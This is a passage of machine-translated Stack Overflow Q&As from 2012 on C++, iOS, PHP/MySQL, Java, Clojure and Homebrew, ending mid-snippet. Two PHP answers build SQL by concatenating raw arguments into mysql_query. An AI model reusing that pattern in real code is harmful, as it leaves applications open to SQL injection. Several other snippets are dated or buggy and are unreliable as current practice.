> ID：11603786
> 
> 赞同：1
> 
> 时间：2012-07-22T20:34:02.133
> 
> 标签：c++, algorithm, vector

如果我有以下情况：

```
#include <iostream>
#include <vector>
#include <algorithm>
#include <iterator>

    struct Features{ int F1, F2, F3, F4; };

    int criterionFunction(Features const& features) {
        return
            -2*features.F1*features.F2
            +3*features.F1
            +5*features.F2
            -2*features.F1*features.F2*features.F3
            +7*features.F3
            +4*features.F4
            -2*features.F1*features.F2*features.F3*features.F4; } 
```

我如何申请`transform()`找到前**三个** *最大值*？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T21:17:33.677

这是一个使用`nth_element`更简单的特征对象和标准函数的示例（以减少混乱）：

```
#include <algorithm>
#include <vector>
#include <iterator>
#include <iostream>

typedef int Features;

int criterionFunction(Features features) {
  return features;
}

int main() {
  std::vector<Features> v { 0, 4, 2, 5, 4, 3, -2, 1 };
  std::nth_element(v.begin(), v.begin() + 3, v.end(),
                   [](Features a, Features b) {
                       return criterionFunction(a) > criterionFunction(b);
                   });
  std::copy(v.begin(), v.begin() + 3,
            std::ostream_iterator<Features>(std::cout, " "));
} 
```

对于您的原始对象，缓存/记忆结果以防止重复调用`Features`可能很有用。`criterionFunction`

注意`nth_element`不对两个分区中的元素进行排序；如果您希望前三个元素按排序顺序，请`partial_sort`改用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:49:14.047

`std::transform`您可以使用,`std::multiset`和插入迭代器的组合。

```
vector<Features> v;
...fill it up
multiset<int> ms;
transform(v.begin(), v.end(), inserter(ms, ms.begin()), criterionFunction); 
```

然后三个最大值是最后三个元素。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T20:36:20.603

你不能。这不是做什么`std::transform`。

`transform`将单个函数应用于序列中的每个元素。它不选择特定元素。

# iphone - NSURLConnection 委托 - 确定哪个函数或连接触发了委托

> ID：11603787
> 
> 赞同：2
> 
> 时间：2012-07-22T20:34:10.177
> 
> 标签：iphone, ios, delegates, nsurlconnection

> **可能重复：**
> [管理两个 NSURLConnection](https://stackoverflow.com/questions/7450806/managing-two-nsurlconnection)
> [NSURLConnection 委托](https://stackoverflow.com/questions/10886237/nsurlconnection-delegate)

我有两种不同的方法调用不同的 NSURLConnections；

方法A

```
NSURLConnection *serverConnection = [[NSURLConnection alloc]initWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:addressOfSideWebService]] delegate:self]; 
```

方法B

```
NSURLConnection *serverConnection = [[NSURLConnection alloc]initWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:addressOfMainWebService]] delegate:self]; 
```

问题是，这两个 NSURLConnections 都触发了相同的委托；

```
-(void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data
{
    [self.serverData appendData:data];
}

-(void)connectionDidFinishLoading:(NSURLConnection *)connection
{    
    NSString *response = [[NSString alloc]initWithData:self.serverData encoding:NSUTF8StringEncoding];
    // use data
} 
```

我想知道的是，我们可以标记 NSURLConnections 或称为 NSURLConnection 的方法，以便识别哪个函数或方法，以便我可以对其采取行动。

我们可以设置不同的代表，还是我应该遵循其他方法？

我希望我很清楚，可以提供任何其他信息。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T20:57:44.977

为什么不设置如下属性：

```
NSURLConnection *serverConnection1;
NSURLConnection  *serverConnection2; 
```

然后像这样使用：

```
serverConnection1 = [[NSURLConnection alloc]initWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:addressOfSideWebService]] delegate:self]; 
```

然后在您的委托方法中检查它是哪个连接：

```
if (connection == serverConnection1) {
    //Do stuff
} else if (connection == serverConnection2) {
    //Do other stuff
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-22T20:46:04.710

您现有的代码使用“self”作为两个调用的委托，这是您问题的根源。

恕我直言，处理此问题的最佳方法是为每个响应处理程序创建单独的类。这有助于保持你的代码干净。这些类应该是包含响应处理代码的 NSURLConnectionDelegates。

当您从调用类创建 NSURLConnection 时，请确保在创建时设置正确的委托。

现在，您的每个 NSURLConnections 都会在完成后回调到它们指定的类。

所以你的调用类可能看起来像这样：

```
#import "FeedDownloader.h"
#import "URLConnectionResponseScenarioADelegate.h"

@implementation FeedDownloader

- (id)init {

    URLConnectionResponseScenarioADelegate *connectionDelegate = [[URLConnectionResponseScenarioADelegate alloc] init];
    NSURLConnection *myConnection = [[NSURLConnection alloc] initWithRequest:[[NSURLRequest alloc] initWithURL:[[NSURL alloc] initWithString:@"http://www.apple.com"]]  delegate:connectionDelegate];

    [myConnection start];
    return self;
}

@end 
```

您的响应处理程序类可能如下所示：

```
#import "URLConnectionResponseScenarioADelegate.h"

@implementation URLConnectionResponseScenarioADelegate
@synthesize data;

#pragma mark NSURLConnection delegate methods

// The following are delegate methods for NSURLConnection. Similar to callback functions, this is how the connection object,
// which is working in the background, can asynchronously communicate back to its delegate on the thread from which it was
// started - in this case, the main thread.

- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response {
    self.data = [NSMutableData data];
}

- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)_data {
    [self.data appendData:_data];
}

- (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error {

}

- (void)connectionDidFinishLoading:(NSURLConnection *)connection {

}

@end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T21:15:34.367

Radesix 提出了一个不错的方法，但它可能有点矫枉过正。解决此问题的简单方法是将每个 NSURLConncection 存储在单独的 ivar 中，并检查委托方法中的指针是否相等。

```
self.serverConnection = [[NSURLConnection alloc] initWithRequest:request delegate:self];

-(void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data
{
    if(connection == self.serverConnection) {
        //Do A
    } else {
        //Do B
    }
} 
```

# php - 在应用程序内通过 HTTP 流播放视频

> ID：11603789
> 
> 赞同：1
> 
> 时间：2012-07-22T20:34:24.607
> 
> 标签：php, ios, http-streaming

我需要在我的应用程序中播放视频。视频将驻留在服务器上。我在某些地方看到，如果您通过服务器交互来查看视频，则应该支持 HTTP 流。有没有人提交了不支持 HTTP 流来缓冲视频的 iOS 应用程序？

是否有任何 PHP 脚本可用于流式传输视频？

# php - PHP函数变量传递

> ID：11603790
> 
> 赞同：1
> 
> 时间：2012-07-22T20:34:29.090
> 
> 标签：php, sql

生锈，只是试图通过参数传递东西。我究竟做错了什么？

```
//Insert into DB
function insert(x,y,z)
mysql_query("INSERT INTO x (y)
VALUES ('z')");

insert("test","name","Tyler"); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T20:37:46.283

```
function insert($x,$y,$z){
    mysql_query("INSERT INTO ".$x." (".$y.") VALUES ('".$z."')");
}
insert("test","name","Tyler"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:38:50.687

确保您通过以下方式正确引用变量`$`：

```
//Insert into DB
function insert($x, $y, $z)
{
    mysql_query("INSERT INTO $x ($y) VALUES ('$z')");
}

insert("test","name","Tyler"); 
```

# ios - iOS 在网格中重用自定义视图对象

> ID：11603791
> 
> 赞同：3
> 
> 时间：2012-07-22T20:34:51.197
> 
> 标签：ios, xcode, reload, reusability

我正在使用双嵌套 for 循环以网格格式添加自定义 UIView 对象（大约 10 个，大小为 100x100）。这些自定义 UIView 对象包含一个 UIButton、UILabel 和另一个自定义 UIView 对象。

当用户刷新屏幕时，我想重新加载数据并显示最新的 UIView 对象。

重新加载时，我将其设置为使用 removeFromSuperView 删除所有旧的 UIView 对象......然后我将所有新的 UIView 对象添加到位。

是否可以重用旧的自定义 UIView 对象？在放置新的自定义视图对象之前，我是否必须删除所有旧的自定义视图对象，或者是否有更清洁、更高效的方法？

# java - Google App Engine / Java：使用 session.setAttribute() 时抛出 ConcurrentModificationException

> ID：11603793
> 
> 赞同：1
> 
> 时间：2012-07-22T20:35:09.700
> 
> 标签：java, google-app-engine, session, google-cloud-datastore

在本地一切正常，但是在部署时，当我从 servlet`ConcurrentModificationException`使用时会被抛出。`session.setAttribute()`在使用 HTML 表单添加实体后，我使用它从数据存储区返回一个值。

我该怎么办？

这是损坏的 servlet：

```
public class AdminServlet extends HttpServlet {
    public void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        Boolean logged = false;
        HttpSession session = req.getSession(true);
        Enumeration<String> names = session.getAttributeNames();

        while(names.hasMoreElements()) {
            String name = (String) names.nextElement();

            if(name.equals("logged")) {
                logged = (Boolean) session.getAttribute("logged");
            }
        }

        if(logged) {
            String p1 = req.getParameter("name");
            String p2 = req.getParameter("value");

            if(p1 != "" && p2 != "") {
                Entity e= new Entity("MyEntity");
                e.setProperty("name", p1);
                e.setProperty("value", p2);

                DatastoreService datastore = DatastoreServiceFactory.getDatastoreService();
                Transaction txn = datastore.beginTransaction();

                Key k = datastore.put(e);

                txn.commit();

                if(txn.isActive())
                    txn.rollback();

                session.setAttribute("returnedKey", KeyFactory.keyToString(k)); // CRASHES HERE
            }
        }

        resp.sendRedirect("adminpage.jsp");
    }
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T21:36:32.650

您在会话上也打开了一个枚举。

> 枚举名称 = session.getAttributeNames();

更改会话中的属性会影响名称，这就是您看到错误的原因。

尝试编写代码以使名称不被使用（无效或超出范围）：

把它放在一个方法中很容易

```
public boolean logLogged(HttpSession session){

    Enumeration<String> names = session.getAttributeNames();

    boolean loggedTmp=false;

    while(names.hasMoreElements()){

        String name = (String) names.nextElement();

        if(name.equals("logged")){
            loggedTmp = (Boolean) session.getAttribute("logged");
        }
    }

    return loggedTmp;

} 
```

# iphone - iOS：核心动画循环链问题

> ID：11603797
> 
> 赞同：1
> 
> 时间：2012-07-22T20:36:11.960
> 
> 标签：iphone, ios, ipad, core-animation, core-graphics

我正在尝试在我的应用程序中制作一些动画，但我遇到了一些错误。一切都从我的“startAnimatingIndicators”方法开始。这个方法的作用是将两条垂直线（它们都在屏幕的每个边缘）动画到我的主视图的中心。完成后，它会调用另一个动画，使两条线最终到达我的视图中心，同时在中心淡入一条新的垂直线。

这一系列动画循环（如您所见，是一个递归方法），直到我按下一个调用 StopAnimatingIndicators 方法的停止按钮。

第一次一切正常，但有时（并非总是），当我第二次运行动画时，它开始不同。有时它从中心的两条垂直线开始，然后它们转到各自的屏幕边缘，然后动画正常流动。有时，两条垂直线都正常到达它们的中心，但它们会继续移动，直到它们到达对面的边缘，然后动画就会正常流动。

我不知道为什么会这样，所以我希望你能给我一些想法。我认为这可能与我的 CGAffinityIdentityTransform 相关，但我无法弄清楚到底是什么问题。我正在使用的代码如下。谢谢！

```
- (void)startAnimatingIndicators
{
    NSInteger metronomePreset = [(NSNumber*)[self.metronomePresets objectAtIndex:self.metronomePresetIndex] intValue];
    NSTimeInterval duration = (60.0 / metronomePreset);

    CGFloat firstPartXTranslation = self.videoPreviewView.center.x - self.indicatorLeft.center.x - self.indicatorLeft.frame.size.width;
    CGFloat secondPartXTranslation = self.indicatorLeft.frame.size.width;

    [self animateIndicatorsWithFirstPartXTranslation:firstPartXTranslation secondPartXTranslation:secondPartXTranslation andDuration:duration];
}

- (void)animateIndicatorsWithFirstPartXTranslation:(CGFloat)firstPartXVariation secondPartXTranslation:(CGFloat)secondPartXTranslation andDuration:(NSTimeInterval)duration
{
    [UIView animateWithDuration:duration 
                          delay:0 
                        options:UIViewAnimationCurveEaseIn | UIViewAnimationOptionAllowUserInteraction
                     animations:^{
                          self.finishingIndicator.alpha = 0.0;
                          self.indicatorLeft.transform = CGAffineTransformTranslate(self.indicatorLeft.transform, firstPartXVariation, 0.0);
                          self.indicatorRight.transform = CGAffineTransformTranslate(self.indicatorRight.transform, -firstPartXVariation, 0.0);
                      } 
                     completion:^(BOOL finished){
                          if(finished)
                          {
                              [UIView animateWithDuration:ANIMATION_END_DURATION 
                                                    delay:0 
                                                  options:UIViewAnimationCurveLinear | UIViewAnimationOptionAllowUserInteraction
                                               animations:^{
                                                   self.finishingIndicator.alpha = 1.0;
                                                   self.indicatorLeft.transform = CGAffineTransformTranslate(self.indicatorLeft.transform, secondPartXTranslation, 0.0);
                                                   self.indicatorRight.transform = CGAffineTransformTranslate(self.indicatorRight.transform, -secondPartXTranslation, 0.0);
                                               }
                                               completion:^(BOOL finished){
                                                   [self stopAnimatingIndicators];
                                                   if(finished)
                                                   {
                                                       [self animateIndicatorsWithFirstPartXTranslation:firstPartXVariation secondPartXTranslation:secondPartXTranslation andDuration:duration];

                                                       [self playSound:@"metronome" withExtension:@"wav"];
                                                   }
                                               }
                               ];
                          }
                      }
      ];
}

- (void)stopAnimatingIndicators
{    
    self.indicatorLeft.transform = CGAffineTransformIdentity;
    self.indicatorRight.transform = CGAffineTransformIdentity;

    [CATransaction begin];
    [self.finishingIndicator.layer removeAllAnimations];
    [self.indicatorLeft.layer removeAllAnimations];
    [self.indicatorRight.layer removeAllAnimations];
    [CATransaction commit];

    self.finishingIndicator.alpha = 0.0;

    [self resetIndicatorsPosition];
}

- (void)resetIndicatorsPosition
{
    CGRect indicatorLeftFrame = self.indicatorLeft.frame;
    CGRect indicatorRightFrame = self.indicatorRight.frame;
    indicatorLeftFrame.origin.x = LEFT_INDICATOR_X_OFFSET;
    indicatorRightFrame.origin.x = RIGHT_INDICATOR_X_OFFSET;
    self.indicatorLeft.frame = indicatorLeftFrame;
    self.indicatorRight.frame = indicatorRightFrame;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:34:46.267

执行以下操作时是否收到编译器错误或警告：

```
indicatorLeftFrame.origin.x = LEFT_INDICATOR_X_OFFSET;
indicatorRightFrame.origin.x = RIGHT_INDICATOR_X_OFFSET; 
```

我的印象是你不能`CGRect`像那样设置 s 的组件。当我尝试时，我肯定会遇到编译器错误并且构建不起作用，所以我什至不确定如何构建。我认为你必须做一个新的`CGRect`：

```
indicatorLeftFrame = CGRectMake(LEFT_INDICATOR_X_OFFSET, 
                                indicatorLeftFrame.origin.y,
                                indicatorLeftFrame.size.width,
                                indicatorLeftFrame.size.height);
indicatorRightFrame = CGRectMake(RIGHT_INDICATOR_X_OFFSET, 
                                 indicatorRightFrame.origin.y,
                                 indicatorRightFrame.size.width,
                                 indicatorRightFrame.size.height); 
```

如果是这种情况（即帧原点没有被正确重置），那么我可以看到您的问题是如何发生的。让我知道这是否有助于评论。

# objective-c - 重复的自定义 UITableViewCell 只绘制最后一个单元格

> ID：11603799
> 
> 赞同：0
> 
> 时间：2012-07-22T20:36:22.243
> 
> 标签：objective-c, ios, uitableview

在我的 UITableView 中，我有几个自定义单元格，然后是一个需要重复 10 次的自定义单元格，每个单元格中的 UILabel 值不同。一切都很好，直到我尝试多次重用我的最后一个自定义单元格。发生的情况是最后一个单元格正确绘制，但前 9 个单元格显示为空白，单元格之间没有拆分。

这是我的代码：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath (NSIndexPath *)indexPath {

static NSString *CellIdentifier = @"Cell";

UITableViewCell *cell = nil;

if (cell == nil) {
    cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
}

// Configure the cell...
switch (indexPath.row) {
    case 0:
        cell = nameCell;
        break;
    case 1:
        cell = globalSettingsCell;
        break;
    case 2:
        cell = queueTypeCell;
        break;
    case 3:
        cell = starMinCell;
        break;
    case 4:
        cell = lengthMaxCell;
        break;
}

if (indexPath.row > 4) {
    cell = genreCell;
    genreLabel.text = [genres objectAtIndex:(indexPath.row - 5)];
}

return cell; 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:22:12.427

您不能同时将一个单元格 (genreCell) 用于多个 indexPath。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:23:05.530

您只有一个标识符，但有多个不同的单元格？而且我认为您不知道如何正确重用 Cells。

尝试这样的事情......

```
static NSString *CellIdentifier_1 = @"Cell_1";
static NSString *CellIdentifier_2 = @"Cell_2";
//...
UITableViewCell *cell = nil;
switch (indexPath.row) {
    case 0:
        cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier_1]; 
        if (cell == nil) {
            cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier_1] autorelease];
        }
        break;
    case 1:
        cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier_2];
        if (cell == nil) {
            cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier_2] autorelease];
        }
        break;
} 
```

# php - 保护目录免受直接 URL 访问

> ID：11603801
> 
> 赞同：3
> 
> 时间：2012-07-22T20:36:30.317
> 
> 标签：php, mysql, apache, .htaccess, mod-rewrite

需要一些帮助...

我需要保护所有`FOLDERS`内容`DIRECTORY`不被**直接`URL`**访问。我可以这样做`.htaccess`吗？如果可以，怎么做？还是他们的方法更安全？

这是我的情况，我允许用户上传 pdf 文件。

文件被发送到`/uploads/{userid}/{filename}`

这一切都很好，但问题是如果有人知道并且`PDF`可以直接访问`{userid}``{filename}`

**我想保护`uploads`目录和所有子目录免受直接 URL 访问。**

但与此同时，我的数据库（MySQL）需要能够浏览`uploads`目录和子目录以确认 PDF 文件已上传，并让管理员从管理控制面板下载文件。

现在我不是要你写我的代码。我只是让您知道我的规格，因为我认为有人可能会建议 htpasswd，但我认为我不能根据我的要求使用该解决方案。

如果您有一个简单的解决方案，或者您可以将我指向正确的教程，请这样做。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T21:32:52.200

正如 Fabio 指出的那样 - 最好将此类文件保留在 Web 根目录之外。但是您仍然可以使用 .htaccess 来保护文件。除非您不小心删除了 .htaccess 或系统管理员更改了主要配置（有时会发生），否则它们将受到保护。

只需将一个 .htaccess 放入您要保护的目录中，然后在该 .htaccess 中放入一行：

```
deny from all 
```

# c# - 测量查询的代码性能，如何看待结果？

> ID：11603802
> 
> 赞同：2
> 
> 时间：2012-07-22T20:36:40.080
> 
> 标签：c#

我有一些看起来像这样的代码：

```
 public void SomeMethodThatLoadsUserData()
    {
       Stopwatch sw = new Stopwatch();
       sw.Start();

       Parallel.Invoke(Method1, Method2, .... , Method12);

       sw.Stop();
       var t = sw.ElapsedMilliseconds;
} 
```

这些方法中的每一个最终都会调用数据库中的查询。当我点击调试按钮时，这段代码第一次运行大约需要 1200 毫秒。然后，当我按下重新启动按钮时，大约 10 次后，结果平均约为 220 毫秒。

**这个巨大的差距是因为 A**）第一次应用程序必须进行某种编译并且生产环境中的实际结果将更接近我在笔记本电脑上的平均 220 毫秒**还是 B**）数据是缓存在 SQL 服务器中，当我重新启动时，从缓存中读取数据，因此该方法在生产环境中的实际性能实际上将更接近我在第一次运行时看到的 1200 毫秒。

感谢您对如何阅读这些数字的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:48:41.590

这可能是由于缓存造成的，具体取决于您查询数据库的方式（orm 可能会缓存，DB 会缓存，..）。您必须考虑以下几点：

*   只运行一次这个方法并没有说什么，运行它几百次并取平均值。因此，您可以消除启动时间、冷缓存以及 .NET 运行时必须在运行时加载的任何内容。
*   模拟数据库以查看数据库端是否发生任何缓存或延迟是否有影响
*   对于许多数据库，有一些工具可以帮助优化 SQL 查询，特别是对于您正在使用的数据库。如果要对查询进行基准测试，请使用这些。
*   使用发布版本运行基准测试，因为它们可能更优化

# math - 为什么clojure返回1N而不是1？

> ID：11603804
> 
> 赞同：2
> 
> 时间：2012-07-22T20:37:23.930
> 
> 标签：math, clojure, return-value

```
;; ------------------------- DICE COEFFS ------------------------

(defn dice-set-coeff [a b]
  (* (/ (count (clojure.set/intersection a b))
        (+ (count a) (count b)))
     2))

(defn dice-lst-coeff [a b]
  (dice-set-coeff (set a) (set b)))

;; ------------------------- BIGRAMS ----------------------------

(defn now-nxt [xs]
  "im sure there is a better way to write this"
  (map #(list %1 %2) xs (rest xs)))

(defn bigram [xs]
  (list now-nxt xs))

(defn dice-string-bigram [a b]
  (dice-lst-coeff (bigram a) (bigram b))) 
```

# 为什么我在结果中得到 1N？

```
tst.core> (dice-string-bigram "hello" "hello")
1N
tst.core> (dice-string-bigram "hello" "helap")
1/2
tst.core> (dice-string-bigram "hello" "howdy")
0
tst.core> (== (dice-string-bigram "hello" "hello") 1)
true 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T21:01:29.050

1N 是阅读器和 REPL 用于 BigInts 的语法。

其中一个调用是返回一个 bigint。

* * *

回复：“我确定有更好的方法来写这个”

```
user> (now-nxt a)
((\h \e) (\e \l) (\l \l) (\l \o))
user> (partition 2 1 a)
((\h \e) (\e \l) (\l \l) (\l \o)) 
```

# macos - 在 Homebrew 上分发 Haskell 程序

> ID：11603808
> 
> 赞同：6
> 
> 时间：2012-07-22T20:37:38.030
> 
> 标签：macos, haskell, homebrew, cabal, haskell-platform

我正在我的 Mac 上用 Haskell 编写一个程序（命令行可执行文件，而不是应用程序）。我正在使用 GitHub 来托管 git 存储库和主页。我制作了`<project>.cabal`and`Setup.hs`文件，因为 Cabal 使构建、测试和生成文档变得容易。我也可能会上传到 Hackage，我不知道。

当我标记版本 1.0 时，我想制作一个 Homebrew 公式来从 GitHub 下载 tarball 并构建它。**我希望唯一的依赖是 GHC**。

我将使用`runhaskell Setup` `configure`/ `build`/ `install`（前缀为 /usr/local/Cellar/...）而不是`cabal`避免依赖 cabal-install 的命令。

这一切都很好，直到我开始使用来自 Hackage 的包，例如 blaze-builder 和 aeson。我应该如何管理这个？

我不想强迫非 Haskell 用户下载整个 Haskell 平台。理想情况下，人们应该能够让 Homebrew 在构建我的程序之前安装 GHC，然后如果他们愿意，在之后删除 GHC。如果我将 Haskell 平台作为依赖项并首先通过 cabal-install 或类似方式安装我的 Haskell 依赖项，

1.  包含包裹的`~/.cabal/`文件夹将被留下，即使之后它们
    `brew uninstall haskell-platform`
2.  我还不如只经历 Hackage 并让人们`cabal install`成为它，即，将大部分范围限制在 Haskellers 上。

我认为 Cabal(-install) + Hackage 对开发和 Haskellers 来说是一个有用的工具，但不适合这个。

我是否应该只下载我正在使用的软件包的源代码并将其包含在我的源代码树中，并将其添加到构建命令中？或者我应该使用该`--package-db`选项（在[此处](http://www.haskell.org/ghc/docs/7.0.2/html/Cabal/builders.html)找到）？或者我的公式可以即时下载软件包的压缩包并构建它吗？

我看了 cabal2arch 一点（[Arch wiki](https://wiki.archlinux.org/index.php/Haskell_Package_Guidelines)，[GitHub repo](https://github.com/archhaskell/cabal2arch)），但我不确定它如何处理依赖关系，或者它是否只是在做我不想做的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-07T09:24:57.727

在我看来，如果您决定使用包管理器，您应该确保所有依赖项都可以构建或以其他方式随时可用。如果您只依赖 GHC 及其核心库集，则不需要构建整个平台。

但是，如果您希望从源代码构建（在许多情况下，IMO 是一个好主意，但不是全部），那么构建所有依赖项是您必须忍受的。我们对我们在 HPC 环境中使用的构建系统 [1] 执行相同的操作，以便在我们的超级计算机上部署科学软件。但这确实是有代价的。引导这样的系统可能需要相当长的时间，因为您希望整个工具链和所有必需的库都存在。

事实上，正如我们所说，我正在为 GHC 和 haskell 包的构建系统提供支持，是的，如果需要，也会引入依赖项。至少，我会确保我们可以部署 cabal，以便我们的用户可以根据需要在他们的帐户上安装 Haskell 的东西。

TL;DR 添加对依赖项的支持。

[1] [http://hpcugent.github.com/easybuild](http://hpcugent.github.com/easybuild)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-02-05T18:55:27.317

[Hledger](http://hledger.org/)是一个 Haskell 程序，只需使用 homebrew 即可安装。您可以在公式文件中查看此处：

> [https://github.com/Homebrew/homebrew-core/blob/master/Formula/hledger.rb](https://github.com/Homebrew/homebrew-core/blob/master/Formula/hledger.rb)

正如您在文件中看到的，它们是包含的一些依赖项`ghc`和`cabal-install`.

# php - MySQL：删除另一个表中没有匹配的行

> ID：11603815
> 
> 赞同：0
> 
> 时间：2012-07-22T20:38:39.280
> 
> 标签：php, mysql

我有 3 个表：链接、关键字和关键字链接。keywords_links 连接另外两个表。现在我正在尝试编写一个删除链接的 PHP 函数。它还必须删除仅由将被删除的链接使用的所有关键字。我被困在 MySQL 查询中以删除这些关键字。

这是我现在拥有的：

```
DELETE FROM keywords INNER JOIN keywords_links ON keywords_links.keyword_id=keywords.id WHERE keywords_links.link_id='123' AND NOT EXISTS(...?) 
```

编辑：这似乎有效，有没有更有效的方法？（没有子查询？）

```
DELETE
FROM keywords
INNER JOIN keywords_links ON keywords_links.keyword_id = keywords.id
WHERE keywords_links.link_id = '123'
AND ! 
EXISTS (
  SELECT * 
  FROM keywords_links
  WHERE keyword_id = keywords.id
  AND link_id != '123'
) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:48:25.483

尝试分离 sql​​s（表为 1），删除链接，删除该链接的所有关键字链接，并删除所有关键字`NOT IN`（或`NOT EXISTS`）keywords_links 表。

这样，您可以删除所有仅由该链接使用的关键字（如果关键字是其他链接中的用户，则将在keywords_links中并且不会被删除）。

或者你可以做两个触发器：`on delete`在链接和`on delete`keywords_links

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:48:26.730

而不是 a `INNER JOIN`，您需要 a`LEFT JOIN`并在相关表中查找 NULL `links`。请先用 a`SELECT`而不是`DELETE FROM`.

```
DELETE FROM
  keywords
  LEFT JOIN keywords_links ON keywords.id = keywords_links.keyword_id
  LEFT JOIN links ON keywords_links.link_id = links.id
WHERE 
  keywords_links.link_id=123
  AND links.id IS NULL 
```

# c++ - 为什么在 Mac OS X 上使用 size_t 时 uint32_t 和 uint64_t 之间存在歧义？

> ID：11603818
> 
> 赞同：16
> 
> 时间：2012-07-22T20:38:54.230
> 
> 标签：c++, macos, gcc, ambiguous

考虑以下示例代码：

```
#include <iostream>
#include <inttypes.h>

using namespace std;

int f(uint32_t i)
{
  return 1;
}
int f(uint64_t i)
{
  return 2;
}

int main ()
{
  cout << sizeof(long unsigned) << '\n';
  cout << sizeof(size_t) << '\n';
  cout << sizeof(uint32_t) << '\n';
  cout << sizeof(uint64_t) << '\n';
  //long unsigned x = 3;
  size_t x = 3;
  cout << f(x) << '\n';
  return 0;
} 
```

这在 Mac OSX 上失败：

```
$ g++ --version
i686-apple-darwin10-g++-4.2.1 (GCC) 4.2.1 (Apple Inc. build 5664)
$ make test
g++     test.cc   -o test
test.cc: In function 'int main()':
test.cc:23: error: call of overloaded 'f(size_t&)' is ambiguous
test.cc:6: note: candidates are: int f(uint32_t)
test.cc:10: note:                 int f(uint64_t)
make: *** [test] Error 1 
```

为什么？因为 'size_t' 应该是无符号的并且是 32 位或 64 位宽。那么歧义在哪里呢？

尝试使用 'unsigned long x' 而不是 'size_t x' 会导致类似的歧义错误消息。

在 Linux/Solaris 系统上，使用不同的 GCC 版本、不同的体系结构等进行测试，没有报告歧义（并且每个体系结构都使用了正确的重载）。

这是 Mac OS X 的错误还是功能？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-22T20:53:53.653

在 Mac OS 下，这些类型定义为：

```
typedef unsigned int         uint32_t;
typedef unsigned long long   uint64_t; 
```

其中 as`size_t`定义为`__SIZE_TYPE__`：

```
#if defined(__GNUC__) && defined(__SIZE_TYPE__)
typedef __SIZE_TYPE__       __darwin_size_t;    /* sizeof() */
#else
typedef unsigned long       __darwin_size_t;    /* sizeof() */
#endif 
```

因此，如果您将代码更改为：

```
#include <iostream>
#include <inttypes.h>

using namespace std;

int f(uint32_t i)
{
  return 1;
}
int f(uint64_t i)
{
  return 2;
}

int f (unsigned long i)
{
  return 3;
}

int main ()
{
  cout << sizeof(unsigned long) << '\n';
  cout << sizeof(size_t) << '\n';
  cout << sizeof(uint32_t) << '\n';
  cout << sizeof(uint64_t) << '\n';
  //long unsigned x = 3;
  size_t x = 3;
  cout << f(x) << '\n';
  return 0;
} 
```

运行它，你会得到：

```
$ g++ -o test test.cpp
$ ./test
8
8
4
8
3 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-03-25T20:55:49.380

如果你真的想要，你可以像这样实现你想要的语义：

```
#define IS_UINT(bits, t) (sizeof(t)==(bits/8) && \
                          std::is_integral<t>::value && \
                          !std::is_signed<t>::value)

template<class T> auto f(T) -> typename std::enable_if<IS_UINT(32,T), int>::type
{
  return 1;
}

template<class T> auto f(T) -> typename std::enable_if<IS_UINT(64,T), int>::type
{
  return 2;
} 
```

不说这是个好主意；只是说你可以做到。

可能有一个很好的标准 C++ 方式来询问编译器“这两种类型是否相同，你知道我的意思，不要对我装傻”，但如果有，我不知道。

* * *

2020 年更新：如果没有宏，您可以更习惯地做到这一点。C++14 给了我们简写`enable_if_t`，C++17 给了我们`is_integral_v`：

```
template<int Bits, class T>
constexpr bool is_uint_v = 
    sizeof(T)==(Bits/8) && std::is_integral_v<T> && !std::is_signed_v<T>;

template<class T> auto f(T) -> std::enable_if_t<is_uint_v<32, T>, int>
    { return 1; }

template<class T> auto f(T) -> std::enable_if_t<is_uint_v<64, T>, int>
    { return 2; } 
```

然后在 C++20 中，我们有 even-shorter-shorthand `requires`：

```
template<int Bits, class T>
constexpr bool is_uint_v =
    sizeof(T)==(Bits/8) && std::is_integral_v<T> && !std::is_signed_v<T>;

template<class T> int f(T) requires is_uint_v<32, T> { return 1; }
template<class T> int f(T) requires is_uint_v<64, T> { return 2; } 
```

甚至更短更短的速记“缩写函数模板”（尽管坦率地说这已经被混淆了，我不会在现实生活中推荐它）：

```
template<class T, int Bits>
concept uint =
    sizeof(T)==(Bits/8) && std::is_integral_v<T> && !std::is_signed_v<T>;

